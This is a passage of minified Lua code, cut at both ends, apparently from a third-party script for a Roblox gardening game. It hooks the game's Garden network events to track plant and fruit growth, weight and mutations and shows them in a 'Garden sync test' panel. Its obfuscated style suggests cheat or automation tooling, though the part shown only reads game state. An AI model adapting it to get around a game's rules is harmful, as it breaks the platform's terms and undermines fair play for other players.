		if type(Z) == "function" then
			g.TestGardenSync.CalculateOvertimeGrowthCache = Z
			return Z
		end
		return nil
	end,
	GetGrowRateData = function()
		if g.TestGardenSync.GrowRateDataCache ~= nil then
			return g.TestGardenSync.GrowRateDataCache ~= false and g.TestGardenSync.GrowRateDataCache or nil
		end
		g.TestGardenSync.GrowRateDataCache = false
		if type(y.GrowRateData) == "table" then
			g.TestGardenSync.GrowRateDataCache = y.GrowRateData
			return y.GrowRateData
		end
		local G = g.TestGardenSync.GetSharedModules()
		local V = G and G:FindFirstChild("GrowRateData")
		local Z = g.TestGardenSync.SafeRequire(V)
		if type(Z) == "table" then
			g.TestGardenSync.GrowRateDataCache = Z
			return Z
		end
		return nil
	end,
	GetDefaultPlantGrowRate = function(G)
		local V = g.TestGardenSync.GetGrowRateData()
		local y = type(V) == "table" and V[tostring(G or "")] or nil
		if type(y) == "table" then
			return tonumber(y.GrowRate) or 0
		end
		return 0
	end;
	GetGenerationFolder = function(G)
		local V = y.ReplicatedStorage and y.ReplicatedStorage:FindFirstChild("PlantGenerationModules")
		if not V then
			return nil
		end
		return V:FindFirstChild(G and "Plants" or "Fruits")
	end,
	GetGenerationModule = function(G, V)
		G = tostring(G or "")
		if G == "" then
			return nil
		end
		local y = ((V and "P:" or "F:")) .. G
		local Z = g.TestGardenSync.GenerationModuleCache[y]
		if Z ~= nil then
			return Z ~= false and Z or nil
		end
		local j = g.TestGardenSync.GetGenerationFolder(V)
		if typeof(j) ~= "Instance" then
			g.TestGardenSync.GenerationModuleCache[y] = false
			return nil
		end
		local i = j:FindFirstChild(G)
		if not i or not i:IsA("ModuleScript") then
			g.TestGardenSync.GenerationModuleCache[y] = false
			return nil
		end
		local c = g.TestGardenSync.SafeRequire(i)
		if type(c) ~= "table" then
			g.TestGardenSync.GenerationModuleCache[y] = false
			return nil
		end
		g.TestGardenSync.GenerationModuleCache[y] = c
		return c
	end;
	GetBaseWeight = function(G, V)
		G = tostring(G or "")
		if G == "" then
			return nil
		end
		local y = ((V and "P:" or "F:")) .. G
		local Z = g.TestGardenSync.BaseWeightCache[y]
		if Z ~= nil then
			return Z ~= false and Z or nil
		end
		local j = g.TestGardenSync.GetGenerationModule(G, V)
		local i = type(j) == "table" and (type(j.GrowData) == "table" and tonumber(j.GrowData.BaseWeight)) or nil
		if not i or i <= 0 then
			g.TestGardenSync.BaseWeightCache[y] = false
			return nil
		end
		g.TestGardenSync.BaseWeightCache[y] = i
		return i
	end;
	GetOvertimeForWeight = function(G, V)
		if not g.TestGardenSync.IsOvertimeEnabled() then
			return 1
		end
		if type(G) ~= "table" then
			return 1
		end
		local y = tonumber(G.OvertimeGrowth)
		if V then
			if not y or y <= 0 then
				local V = tonumber(G.FinishedGrowingAt) or 0
				local Z = g.TestGardenSync.GetCalculateOvertimeGrowth()
				if V > 0 and type(Z) == "function" then
					local G, j = pcall(function()
						return Z(os.time() - V)
					end)
					if G and tonumber(j) then
						y = math.max(tonumber(j) or 1, 1)
					end
				end
			end
			return math.clamp(tonumber(y) or 1, 1, 100)
		end
		return tonumber(y) or 1
	end,
	GetWeightData = function(G, V, y)
		if type(V) ~= "table" then
			return {
				kg = 0;
				grams = 0,
				text = "0.00kg",
				base = 0;
				size = 1;
				overtime = 1,
				has_weight = false
			}
		end
		local Z = g.TestGardenSync.GetBaseWeight(G, y) or 0
		local j = tonumber(V.SizeMultiplier or V.SizeMulti) or 1
		local i = g.TestGardenSync.GetOvertimeForWeight(V, y)
		local c = (Z * j) * i
		return {
			kg = g.TestGardenSync.Round2(c);
			grams = c,
			text = g.TestGardenSync.FormatKg(c);
			base = Z,
			size = j,
			overtime = i,
			has_weight = c > 0
		}
	end,
	GetSeedData = function(G)
		G = tostring(G or "")
		if G == "" then
			return nil
		end
		if type(y.SeedData) == "table" then
			for V, y in ipairs(y.SeedData) do
				if type(y) == "table" and y.SeedName == G then
					return y
				end
			end
		end
		return nil
	end;
	IsSingleHarvestPlant = function(G)
		G = tostring(G or "")
		if G == "" then
			return false
		end
		local V = g.TestGardenSync.GetSeedData(G)
		if type(V) == "table" and V.IsSingleHarvest ~= nil then
			return V.IsSingleHarvest == true
		end
		if type(y.PlantVisualizerController) == "table" and type(y.PlantVisualizerController.IsSingleHarvestPlant) == "function" then
			local V, Z = pcall(function()
				return y.PlantVisualizerController:IsSingleHarvestPlant(G)
			end)
			if V and type(Z) == "boolean" then
				return Z
			end
		end
		if Z.SeedData and type(Z.SeedData.IsSingleHarvest) == "function" then
			return Z.SeedData.IsSingleHarvest(G) == true
		end
		return type(g.SeedSingleHarvest) == "table" and g.SeedSingleHarvest[G] == true
	end;
	EstimateStartingAge = function(G)
		if type(G) ~= "table" then
			return 0
		end
		local V = g.TestGardenSync.N(G.Age, 0)
		local y = g.TestGardenSync.N(G.MaxAge, 0)
		if y <= 0 then
			return V
		end
		local Z = g.TestGardenSync.N(G.FinishedGrowingAt, 0)
		local j = g.TestGardenSync.N(G.GrowRate or G.StableGrowthAmount or G.GrowthRate, 0)
		if Z > 0 then
			local G = g.TestGardenSync.WallNow()
			if G >= Z then
				return y
			end
			if j > 0 then
				V = math.max(V, y - (((Z - G)) * j))
			end
		end
		return math.clamp(V, 0, y)
	end,
	GetPlantGrowthRate = function(G)
		if type(G) ~= "table" then
			return 0
		end
		local V = tonumber(G.BoostExpiresClock) or 0
		if V > 0 and g.TestGardenSync.Now() >= V then
			G.StableGrowthAmount = tonumber(G.PostBoostRate) or tonumber(G.StableGrowthAmount) or 0
			G.BoostExpiresClock = 0
		end
		return tonumber(G.StableGrowthAmount or G.GrowthRate or G.GrowRate) or 0
	end;
	AdvancePlant = function(G)
		if type(G) ~= "table" or G.Removed then
			return G
		end
		local V = g.TestGardenSync.N(G.MaxAge, 0)
		if V <= 0 then
			return G
		end
		local y = g.TestGardenSync.N(G.CurrentAge, G.Age or 0)
		if y >= V then
			G.CurrentAge = V
			G.Age = V
			G.LastClock = g.TestGardenSync.Now()
			return G
		end
		local Z = g.TestGardenSync.N(G.FinishedGrowingAt, 0)
		if Z > 0 and g.TestGardenSync.WallNow() >= Z then
			G.CurrentAge = V
			G.Age = V
			G.LastClock = g.TestGardenSync.Now()
			return G
		end
		local j = g.TestGardenSync.Now()
		local i = math.max(j - g.TestGardenSync.N(G.LastClock, j), 0)
		local c = g.TestGardenSync.GetPlantGrowthRate(G)
		if i > 0 and c > 0 then
			y = math.min(y + (i * c), V)
			G.CurrentAge = y
			G.Age = y
			G.LastClock = j
		end
		return G
	end,
	IsPlantReady = function(G)
		if type(G) ~= "table" or G.Removed then
			return false
		end
		g.TestGardenSync.AdvancePlant(G)
		local V = g.TestGardenSync.N(G.MaxAge, 0)
		return V > 0 and g.TestGardenSync.N(G.CurrentAge, G.Age or 0) >= V
	end,
	EnsurePlant = function(G, V)
		G = tostring(G or "")
		if G == "" then
			return nil
		end
		local y = g.TestGardenSync.Plants[G]
		if not y then
			y = {
				Id = G,
				PlantId = G,
				Fruits = {},
				CurrentAge = 0;
				StableGrowthAmount = 0;
				BoostExpiresClock = 0,
				PostBoostRate = 0;
				BoostSources = 0,
				AddedAt = g.TestGardenSync.Now();
				LastClock = g.TestGardenSync.Now(),
				LastUpdate = g.TestGardenSync.Now()
			}
			g.TestGardenSync.Plants[G] = y
		end
		if type(V) == "table" then
			g.TestGardenSync.CopyFields(V, y)
			local Z = V.PlantName or y.PlantName or ""
			local j = g.TestGardenSync.N(y.CurrentAge, y.Age or 0)
			local i = g.TestGardenSync.N(V.MaxAge, y.MaxAge or 0)
			local c = g.TestGardenSync.EstimateStartingAge(V)
			local J = g.TestGardenSync.GetDefaultPlantGrowRate(Z)
			local T = tonumber(y.StableGrowthAmount)
			if not T or T <= 0 then
				T = J
			end
			y.Id = G
			y.PlantId = G
			y.PlantName = Z
			y.Mutation = V.Mutation or y.Mutation
			y.Variant = V.Variant or y.Variant
			y.CurrentAge = math.clamp(math.max(j, c), 0, i > 0 and i or math.huge)
			y.Age = y.CurrentAge
			y.MaxAge = i
			y.SizeMultiplier = g.TestGardenSync.N(V.SizeMultiplier, y.SizeMultiplier or 1)
			y.OvertimeGrowth = V.OvertimeGrowth or y.OvertimeGrowth
			y.FinishedGrowingAt = V.FinishedGrowingAt or y.FinishedGrowingAt
			y.StableGrowthAmount = g.TestGardenSync.N(V.StableGrowthAmount or V.GrowRate or V.GrowthRate, T)
			y.PostBoostRate = g.TestGardenSync.N(y.PostBoostRate, y.StableGrowthAmount)
			y.LastClock = g.TestGardenSync.Now()
			y.LastUpdate = g.TestGardenSync.Now()
			y.Removed = false
		end
		return y
	end;
	EnsureFruit = function(G, V, y, Z)
		G = tostring(G or "")
		V = tostring(V or "")
		if G == "" or V == "" then
			return nil
		end
		local j = g.TestGardenSync.EnsurePlant(G, y)
		if not j then
			return nil
		end
		local i = g.TestGardenSync.Key(G, V)
		local c = g.TestGardenSync.Fruits[i]
		if not c then
			c = {
				Key = i;
				PlantId = G;
				FruitId = V,
				CurrentAge = 0,
				GrowthRate = 0;
				MaxAge = 0,
				OvertimeGrowth = 1,
				LastClock = g.TestGardenSync.Now();
				AddedAt = g.TestGardenSync.Now(),
				LastUpdate = g.TestGardenSync.Now()
			}
			g.TestGardenSync.Fruits[i] = c
			j.Fruits[V] = c
		end
		if type(Z) == "table" then
			g.TestGardenSync.CopyFields(Z, c)
			local G = g.TestGardenSync.N(c.CurrentAge, 0)
			local V = g.TestGardenSync.N(Z.MaxAge, c.MaxAge or 0)
			local y = g.TestGardenSync.EstimateStartingAge(Z)
			c.CurrentAge = math.clamp(math.max(G, y), 0, V > 0 and V or math.huge)
			c.GrowthRate = g.TestGardenSync.N(Z.GrowRate, c.GrowthRate or 0)
			c.MaxAge = V
			c.SizeMultiplier = g.TestGardenSync.N(Z.SizeMultiplier, c.SizeMultiplier or 1)
			c.OvertimeGrowth = g.TestGardenSync.N(Z.OvertimeGrowth, c.OvertimeGrowth or 1)
			c.Mutation = Z.Mutation or c.Mutation
			c.Seed = Z.Seed or c.Seed
			c.SpawnLocationIndex = Z.SpawnLocationIndex or c.SpawnLocationIndex
			c.FinishedGrowingAt = Z.FinishedGrowingAt or c.FinishedGrowingAt
			c.LastClock = g.TestGardenSync.Now()
			c.LastUpdate = g.TestGardenSync.Now()
			c.Removed = false
			g.TestGardenSync.RemovedFruits[i] = nil
		end
		return c
	end,
	AdvanceFruit = function(G)
		if type(G) ~= "table" or G.Removed then
			return G
		end
		local V = g.TestGardenSync.N(G.MaxAge, 0)
		if V <= 0 then
			return G
		end
		local y = g.TestGardenSync.N(G.CurrentAge, 0)
		if y >= V then
			G.CurrentAge = V
			G.LastClock = g.TestGardenSync.Now()
			return G
		end
		local Z = g.TestGardenSync.Now()
		local j = math.max(Z - g.TestGardenSync.N(G.LastClock, Z), 0)
		local i = g.TestGardenSync.N(G.GrowthRate, 0)
		if j > 0 and i > 0 then
			y = math.min(y + (j * i), V)
			G.CurrentAge = y
			G.Age = y
			G.LastClock = Z
		end
		return G
	end;
	IsFruitReady = function(G)
		if type(G) ~= "table" or G.Removed then
			return false
		end
		g.TestGardenSync.AdvanceFruit(G)
		local V = g.TestGardenSync.N(G.MaxAge, 0)
		return V > 0 and g.TestGardenSync.N(G.CurrentAge, 0) >= V
	end;
	SyncFromGarden = function()
		local G = g.TestGardenSync.GetGarden()
		if type(G) ~= "table" then
			return false
		end
		for G, V in pairs(G) do
			if type(V) ~= "table" then
				continue
			end
			g.TestGardenSync.EnsurePlant(G, V)
			if type(V.Fruits) == "table" then
				for y, Z in pairs(V.Fruits) do
					if type(Z) == "table" then
						g.TestGardenSync.EnsureFruit(G, y, V, Z)
					end
				end
			end
		end
		return true
	end,
	OnPlantAdded = function(G, V, y)
		if not g.TestGardenSync.IsMine(G) then
			return
		end
		g.TestGardenSync.EnsurePlant(V, y)
		if type(y) == "table" and type(y.Fruits) == "table" then
			for G, Z in pairs(y.Fruits) do
				g.TestGardenSync.EnsureFruit(V, G, y, Z)
			end
		end
		g.TestGardenSync.RefreshPlantDropdown()
		g.TestGardenSync.Render()
	end;
	OnPlantRemoved = function(G, V)
		if not g.TestGardenSync.IsMine(G) then
			return
		end
		V = tostring(V or "")
		local y = g.TestGardenSync.Plants[V]
		if y then
			y.Removed = true
			y.RemovedAt = g.TestGardenSync.Now()
			for G, V in pairs(y.Fruits or {}) do
				if type(V) == "table" then
					V.Removed = true
					V.RemovedAt = g.TestGardenSync.Now()
					g.TestGardenSync.RemovedFruits[V.Key] = true
				end
			end
		end
		g.TestGardenSync.RefreshPlantDropdown()
		g.TestGardenSync.Render()
	end,
	OnPlantGrowthUpdated = function(G, V, y, Z, j, i, c)
		if not g.TestGardenSync.IsMine(G) then
			return
		end
		local J = g.TestGardenSync.EnsurePlant(V)
		if J then
			g.TestGardenSync.AdvancePlant(J)
			local G = g.TestGardenSync.N(J.MaxAge, 0)
			local V = g.TestGardenSync.N(y, 0)
			local T = g.TestGardenSync.N(J.CurrentAge, 0)
			J.CurrentAge = G > 0 and math.min(math.max(V, T), G) or math.max(V, T)
			J.Age = J.CurrentAge
			J.StableGrowthAmount = g.TestGardenSync.N(Z, J.StableGrowthAmount or 0)
			local d = g.TestGardenSync.N(j, 0)
			J.BoostExpiresClock = d > 0 and (g.TestGardenSync.Now() + d) or 0
			J.PostBoostRate = g.TestGardenSync.N(i, J.StableGrowthAmount or 0)
			J.BoostSources = c or J.BoostSources or 0
			J.LastClock = g.TestGardenSync.Now()
			J.LastUpdate = g.TestGardenSync.Now()
		end
		g.TestGardenSync.Render()
	end,
	OnPlantAgeSync = function(G, V)
		if not g.TestGardenSync.IsMine(G) or type(V) ~= "table" then
			return
		end
		for G, V in pairs(V) do
			local y = g.TestGardenSync.EnsurePlant(G)
			if y then
				g.TestGardenSync.AdvancePlant(y)
				local G = g.TestGardenSync.N(y.MaxAge, 0)
				local Z = g.TestGardenSync.N(V, 0)
				if G > 0 and (g.TestGardenSync.N(y.CurrentAge, 0) >= G and Z < G) then
					Z = G
				end
				y.CurrentAge = G > 0 and math.min(math.max(Z, y.CurrentAge or 0), G) or math.max(Z, y.CurrentAge or 0)
				y.Age = y.CurrentAge
				y.LastClock = g.TestGardenSync.Now()
				y.LastUpdate = g.TestGardenSync.Now()
			end
		end
		g.TestGardenSync.Render()
	end,
	OnPlantMutationUpdated = function(G, V, y)
		if not g.TestGardenSync.IsMine(G) then
			return
		end
		local Z = g.TestGardenSync.EnsurePlant(V)
		if Z then
			Z.Mutation = y ~= "" and y or nil
			Z.LastUpdate = g.TestGardenSync.Now()
		end
		g.TestGardenSync.Render()
	end;
	OnFruitAdded = function(G, V, y, Z)
		if not g.TestGardenSync.IsMine(G) then
			return
		end
		local j = g.TestGardenSync.GetGarden()
		local i = type(j) == "table" and j[tostring(V or "")] or nil
		g.TestGardenSync.EnsureFruit(V, y, i, Z)
		g.TestGardenSync.Render()
	end,
	OnFruitRemoved = function(G, V, y)
		if not g.TestGardenSync.IsMine(G) then
			return
		end
		V = tostring(V or "")
		y = tostring(y or "")
		local Z = g.TestGardenSync.Key(V, y)
		local j = g.TestGardenSync.Fruits[Z]
		if j then
			j.Removed = true
			j.RemovedAt = g.TestGardenSync.Now()
			g.TestGardenSync.RemovedFruits[Z] = true
		end
		local i = g.TestGardenSync.Plants[V]
		if i and i.Fruits then
			i.Fruits[y] = nil
		end
		g.TestGardenSync.Render()
	end;
	OnFruitGrowthUpdated = function(G, V, y, Z, j)
		if not g.TestGardenSync.IsMine(G) then
			return
		end
		local i = g.TestGardenSync.EnsureFruit(V, y)
		if not i then
			return
		end
		g.TestGardenSync.AdvanceFruit(i)
		local c = g.TestGardenSync.N(i.MaxAge, 0)
		local J = g.TestGardenSync.N(Z, 0)
		local T = g.TestGardenSync.N(i.CurrentAge, 0)
		i.GrowthRate = g.TestGardenSync.N(j, i.GrowthRate or 0)
		i.CurrentAge = c > 0 and math.min(math.max(J, T), c) or math.max(J, T)
		i.Age = i.CurrentAge
		i.LastClock = g.TestGardenSync.Now()
		i.LastUpdate = g.TestGardenSync.Now()
		g.TestGardenSync.Render()
	end,
	OnFruitAgeSync = function(G, V, y)
		if not g.TestGardenSync.IsMine(G) or type(y) ~= "table" then
			return
		end
		for G, y in pairs(y) do
			local Z = g.TestGardenSync.EnsureFruit(V, G)
			if Z then
				g.TestGardenSync.AdvanceFruit(Z)
				local G = g.TestGardenSync.N(Z.MaxAge, 0)
				local V = g.TestGardenSync.N(y, 0)
				if G > 0 and (g.TestGardenSync.N(Z.CurrentAge, 0) >= G and V < G) then
					V = G
				end
				Z.CurrentAge = G > 0 and math.min(math.max(V, Z.CurrentAge or 0), G) or math.max(V, Z.CurrentAge or 0)
				Z.Age = Z.CurrentAge
				Z.LastClock = g.TestGardenSync.Now()
				Z.LastUpdate = g.TestGardenSync.Now()
			end
		end
		g.TestGardenSync.Render()
	end;
	OnFruitOvertimeGrowthUpdated = function(G, V, y, Z)
		if not g.TestGardenSync.IsMine(G) then
			return
		end
		local j = g.TestGardenSync.EnsureFruit(V, y)
		if j then
			j.OvertimeGrowth = g.TestGardenSync.N(Z, j.OvertimeGrowth or 1)
			j.LastUpdate = g.TestGardenSync.Now()
		end
		g.TestGardenSync.Render()
	end;
	OnFruitMutationUpdated = function(G, V, y, Z)
		if not g.TestGardenSync.IsMine(G) then
			return
		end
		local j = g.TestGardenSync.EnsureFruit(V, y)
		if j then
			j.Mutation = Z ~= "" and Z or nil
			j.LastUpdate = g.TestGardenSync.Now()
		end
		g.TestGardenSync.Render()
	end,
	ConnectGardenRemote = function(G, V)
		local Z = y.Networking and y.Networking.Garden
		local j = Z and Z[G]
		if not j or not j.OnClientEvent or type(V) ~= "function" then
			return false
		end
		local i, c = pcall(function()
			return j.OnClientEvent:Connect(V)
		end)
		if i and c then
			table.insert(g.TestGardenSync.Connections, c)
			return true
		end
		return false
	end;
	Start = function()
		if g.TestGardenSync.Started then
			g.TestGardenSync.Render()
			return true
		end
		g.TestGardenSync.Started = true
		g.TestGardenSync.SyncFromGarden()
		g.TestGardenSync.ConnectGardenRemote("PlantAdded", g.TestGardenSync.OnPlantAdded)
		g.TestGardenSync.ConnectGardenRemote("PlantRemoved", g.TestGardenSync.OnPlantRemoved)
		g.TestGardenSync.ConnectGardenRemote("PlantGrowthUpdated", g.TestGardenSync.OnPlantGrowthUpdated)
		g.TestGardenSync.ConnectGardenRemote("PlantAgeSync", g.TestGardenSync.OnPlantAgeSync)
		g.TestGardenSync.ConnectGardenRemote("PlantMutationUpdated", g.TestGardenSync.OnPlantMutationUpdated)
		g.TestGardenSync.ConnectGardenRemote("FruitAdded", g.TestGardenSync.OnFruitAdded)
		g.TestGardenSync.ConnectGardenRemote("FruitRemoved", g.TestGardenSync.OnFruitRemoved)
		g.TestGardenSync.ConnectGardenRemote("FruitGrowthUpdated", g.TestGardenSync.OnFruitGrowthUpdated)
		g.TestGardenSync.ConnectGardenRemote("FruitAgeSync", g.TestGardenSync.OnFruitAgeSync)
		g.TestGardenSync.ConnectGardenRemote("FruitOvertimeGrowthUpdated", g.TestGardenSync.OnFruitOvertimeGrowthUpdated)
		g.TestGardenSync.ConnectGardenRemote("FruitMutationUpdated", g.TestGardenSync.OnFruitMutationUpdated)
		g.TestGardenSync.RefreshPlantDropdown()
		g.TestGardenSync.StartRenderLoop()
		g.TestGardenSync.Render()
		return true
	end;
	Stop = function()
		g.TestGardenSync.Started = false
		for G, V in ipairs(g.TestGardenSync.Connections) do
			pcall(function()
				V:Disconnect()
			end)
		end
		table.clear(g.TestGardenSync.Connections)
		if g.TestGardenSync.Label then
			g.TestGardenSync.Label:SetText(g.TestGardenSync.C(g.TestGardenSync.Colours.Bad, "Garden sync test stopped."))
		end
		return true
	end,
	Reset = function()
		table.clear(g.TestGardenSync.Plants)
		table.clear(g.TestGardenSync.Fruits)
		table.clear(g.TestGardenSync.RemovedFruits)
		g.TestGardenSync.SyncFromGarden()
		g.TestGardenSync.RefreshPlantDropdown()
		g.TestGardenSync.Render()
	end;
	StartRenderLoop = function()
		if g.TestGardenSync.RenderLoopRunning then
			return
		end
		g.TestGardenSync.RenderLoopRunning = true
		task.spawn(function()
			while g.TestGardenSync.Started do
				g.TestGardenSync.Render()
				task.wait(g.TestGardenSync.RenderInterval)
			end
			g.TestGardenSync.RenderLoopRunning = false
		end)
	end;
	GetPlantList = function()
		local G = {}
		for V, y in pairs(g.TestGardenSync.Plants) do
			if type(y) == "table" and not y.Removed then
				table.insert(G, y)
			end
		end
		table.sort(G, function(G, V)
			return tostring(G.PlantName or "") < tostring(V.PlantName or "")
		end)
		return G
	end,
	BuildFruitResult = function(G, V, y)
		if type(G) ~= "table" then
			return nil
		end
		local Z = tostring(G.PlantName or "")
		local j = tostring(G.Id or G.PlantId or "")
		if Z == "" or j == "" then
			return nil
		end
		local i = y and G or V
		if type(i) ~= "table" then
			return nil
		end
		if y then
			g.TestGardenSync.AdvancePlant(G)
		else
			g.TestGardenSync.AdvanceFruit(V)
		end
		local c = y and g.TestGardenSync.IsPlantReady(G) or g.TestGardenSync.IsFruitReady(V)
		if not c then
			return nil
		end
		local J = tostring(i.Mutation or G.Mutation or "")
		local T = g.TestGardenSync.GetVariant(J, i.Variant or G.Variant)
		local d = g.TestGardenSync.GetWeightData(Z, i, y)
		return {
			name = Z;
			plantId = j,
			fruitId = y and "" or tostring(V.FruitId or "");
			w = d.kg,
			kg = d.kg;
			kg_text = d.text;
			grams = d.grams;
			base_weight = d.base,
			size_multiplier = d.size,
			overtime_growth = d.overtime,
			has_weight = d.has_weight,
			r = (type(g.SeedRarity) == "table" and g.SeedRarity[Z]) or "Common";
			m = J,
			v = T;
			age = y and g.TestGardenSync.N(G.CurrentAge, G.Age or 0) or g.TestGardenSync.N(V.CurrentAge, 0),
			max_age = y and g.TestGardenSync.N(G.MaxAge, 0) or g.TestGardenSync.N(V.MaxAge, 0);
			grow_rate = y and g.TestGardenSync.GetPlantGrowthRate(G) or g.TestGardenSync.N(V.GrowthRate, 0),
			ready = true,
			sync = true,
			single_harvest = y == true,
			raw = i,
			plant_raw = G
		}
	end;
	GetFruits = function()
		if not g.TestGardenSync.Started then
			g.TestGardenSync.Start()
		else
			g.TestGardenSync.SyncFromGarden()
		end
		local G = {}
		for V, y in pairs(g.TestGardenSync.Plants) do
			if type(y) ~= "table" or y.Removed then
				continue
			end
			local Z = tostring(y.PlantName or "")
			if Z == "" then
				continue
			end
			if g.TestGardenSync.IsSingleHarvestPlant(Z) then
				local V = g.TestGardenSync.BuildFruitResult(y, nil, true)
				if V and V.has_weight then
					table.insert(G, V)
				end
			else
				for V, Z in pairs(y.Fruits or {}) do
					if type(Z) == "table" and not Z.Removed then
						local V = g.TestGardenSync.BuildFruitResult(y, Z, false)
						if V and V.has_weight then
							table.insert(G, V)
						end
					end
				end
			end
		end
		table.sort(G, function(G, V)
			local y = type(g.RarityRank) == "table" and g.RarityRank or {}
			local Z = y[G.r] or 0
			local j = y[V.r] or 0
			if Z ~= j then
				return Z > j
			end
			local i = type(G.m) == "string" and G.m ~= ""
			local c = type(V.m) == "string" and V.m ~= ""
			if i ~= c then
				return i
			end
			return ((tonumber(G.kg) or 0)) > ((tonumber(V.kg) or 0))
		end)
		return G
	end;
	GetReadyFruits = function()
		return g.TestGardenSync.GetFruits()
	end;
	GetPlantDropdownValues = function()
		local G = {}
		for V, y in ipairs(g.TestGardenSync.GetPlantList()) do
			local Z = tostring(y.PlantName or "Plant")
			local j = 0
			local i = 0
			local c = g.TestGardenSync.IsSingleHarvestPlant(Z)
			if c then
				j = 1
				if g.TestGardenSync.IsPlantReady(y) then
					i = 1
				end
			else
				for G, V in pairs(y.Fruits or {}) do
					if type(V) == "table" and not V.Removed then
						j += 1
						if g.TestGardenSync.IsFruitReady(V) then
							i += 1
						end
					end
				end
			end
			table.insert(G, {
				Text = string.format("%s <font color=\"#888888\">%s</font> <font color=\"#7CFC00\">%d ready</font><font color=\"#AAAAAA\">/%d</font>%s", g.TestGardenSync.Html(Z), g.TestGardenSync.Html(g.TestGardenSync.ShortId(y.Id)), i, j, c and " <font color=\"#FFD166\">Single</font>" or ""),
				Value = y.Id
			})
		end
		return G
	end,
	RefreshPlantDropdown = function()
		if g.TestGardenSync.Dropdown and type(g.TestGardenSync.Dropdown.SetValues) == "function" then
			g.TestGardenSync.Dropdown:SetValues(g.TestGardenSync.GetPlantDropdownValues())
		end
	end;
	SetWatchPlant = function(G)
		g.TestGardenSync.WatchPlantId = tostring(G or "")
		g.TestGardenSync.Render()
	end,
	FormatFruitLine = function(G, V, y, Z)
		local j = g.TestGardenSync.Colours
		local i = Z and V or y
		local c = tostring(V.PlantName or "")
		if Z then
			g.TestGardenSync.AdvancePlant(V)
		else
			g.TestGardenSync.AdvanceFruit(y)
		end
		local J = Z and g.TestGardenSync.IsPlantReady(V) or g.TestGardenSync.IsFruitReady(y)
		local T = tostring(i and i.Mutation or V.Mutation or "")
		local d = g.TestGardenSync.GetVariant(T, i and i.Variant or V.Variant)
		local u = g.TestGardenSync.GetVariantColour(d)
		local q = g.TestGardenSync.GetWeightData(c, i, Z)
		local E = Z and g.TestGardenSync.N(V.CurrentAge, V.Age or 0) or g.TestGardenSync.N(y.CurrentAge, 0)
		local a = Z and g.TestGardenSync.N(V.MaxAge, 0) or g.TestGardenSync.N(y.MaxAge, 0)
		local H = Z and g.TestGardenSync.GetPlantGrowthRate(V) or g.TestGardenSync.N(y.GrowthRate, 0)
		return string.format("   %s %s %s %s %s %s %s %s %s", g.TestGardenSync.C(J and j.Ready or j.Growing, J and "READY" or "GROWING"), g.TestGardenSync.C(j.Fruit, Z and "Single Harvest" or ("Fruit " .. tostring(G))), g.TestGardenSync.C(j.Id, "[" .. (g.TestGardenSync.ShortId(Z and V.Id or y.FruitId) .. "]")), g.TestGardenSync.C(j.Muted, "Age: " .. (tostring(g.TestGardenSync.Round2(E)) .. ("/" .. tostring(g.TestGardenSync.N(a, 0))))), g.TestGardenSync.C(j.Muted, "Rate: " .. tostring(g.TestGardenSync.Round4(H))), g.TestGardenSync.C(j.Kg, "KG: " .. q.text), g.TestGardenSync.C(j.Muted, "Base: " .. tostring(g.TestGardenSync.Round2(q.base))), g.TestGardenSync.C(j.Muted, "Size: " .. (tostring(g.TestGardenSync.Round2(q.size)) .. (" OT: " .. tostring(g.TestGardenSync.Round2(q.overtime))))), T ~= "" and g.TestGardenSync.C(u, "Mutation: " .. (T .. (" / " .. d))) or g.TestGardenSync.C(j.Normal, "Mutation: none / Normal"))
	end,
	FormatPlant = function(G)
		if type(G) ~= "table" then
			return ""
		end
		g.TestGardenSync.AdvancePlant(G)
		local V = g.TestGardenSync.Colours
		local y = {}
		local Z = tostring(G.PlantName or "Unknown")
		local j = g.TestGardenSync.IsSingleHarvestPlant(Z)
		local i = g.TestGardenSync.MutationText(G.Mutation)
		local c = g.TestGardenSync.GetVariant(i, G.Variant)
		local J = g.TestGardenSync.GetVariantColour(c)
		local T = j and g.TestGardenSync.GetWeightData(Z, G, true) or nil
		table.insert(y, string.format("%s %s %s %s %s %s", g.TestGardenSync.C(V.Plant, "Plant: " .. Z), g.TestGardenSync.C(V.Id, "[" .. (g.TestGardenSync.ShortId(G.Id) .. "]")), g.TestGardenSync.C(J, "Variant: " .. c), g.TestGardenSync.C(V.Muted, "Age: " .. (tostring(g.TestGardenSync.Round2(g.TestGardenSync.N(G.CurrentAge, G.Age or 0))) .. ("/" .. tostring(g.TestGardenSync.N(G.MaxAge, 0))))), j and g.TestGardenSync.C("#FFD166", "Single Harvest") or g.TestGardenSync.C(V.Muted, "Multi Harvest"), T and g.TestGardenSync.C(V.Kg, "KG: " .. T.text) or g.TestGardenSync.C(V.Muted, "KG: fruit-based")))
		if i ~= "" then
			table.insert(y, "   " .. g.TestGardenSync.C(J, "Plant Mutation: " .. i))
		end
		if j then
			table.insert(y, g.TestGardenSync.FormatFruitLine(1, G, nil, true))
			return table.concat(y, "\n")
		end
		local d = {}
		for G, V in pairs(G.Fruits or {}) do
			if type(V) == "table" and not V.Removed then
				g.TestGardenSync.AdvanceFruit(V)
				table.insert(d, V)
			end
		end
		table.sort(d, function(G, V)
			local y = g.TestGardenSync.IsFruitReady(G)
			local Z = g.TestGardenSync.IsFruitReady(V)
			if y ~= Z then
				return y
			end
			return g.TestGardenSync.N(G.CurrentAge, 0) > g.TestGardenSync.N(V.CurrentAge, 0)
		end)
		for Z, j in ipairs(d) do
			if Z > g.TestGardenSync.MaxFruitsPerPlant then
				table.insert(y, g.TestGardenSync.C(V.Muted, "   ... +" .. (tostring(# d - g.TestGardenSync.MaxFruitsPerPlant) .. " more fruits")))
				break
			end
			table.insert(y, g.TestGardenSync.FormatFruitLine(Z, G, j, false))
		end
		if # d == 0 then
			table.insert(y, g.TestGardenSync.C(V.Muted, "   No fruits stored for this plant yet."))
		end
		return table.concat(y, "\n")
	end;
	BuildText = function()
		local G = g.TestGardenSync.Colours
		local V = g.TestGardenSync.GetPlantList()
		local y = 0
		local Z = 0
		local j = 0
		for G, V in ipairs(V) do
			local i = tostring(V.PlantName or "")
			if g.TestGardenSync.IsSingleHarvestPlant(i) then
				j += 1
				y += 1
				if g.TestGardenSync.IsPlantReady(V) then
					Z += 1
				end
			else
				for G, V in pairs(V.Fruits or {}) do
					if type(V) == "table" and not V.Removed then
						y += 1
						if g.TestGardenSync.IsFruitReady(V) then
							Z += 1
						end
					end
				end
			end
		end
		local i = {
			g.TestGardenSync.C(G.Title, "DATA GARDEN SYNC TEST");
